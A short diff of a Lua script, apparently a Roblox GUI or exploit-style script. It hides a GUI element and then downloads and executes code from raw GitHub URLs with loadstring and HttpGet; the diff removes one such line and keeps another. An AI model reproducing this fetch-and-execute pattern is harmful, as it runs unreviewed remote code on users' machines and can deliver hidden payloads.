@@ -73,7 +73,6 @@ local function HJHKA_fake_script() -- F.l
 	wait(7)
 	script.Parent.Visible = false
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/vpetru'),true))()
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/LAOO'),true))()
 end
 coroutine.wrap(HJHKA_fake_script)()
 local function XUAPOO_fake_script() -- q.u 
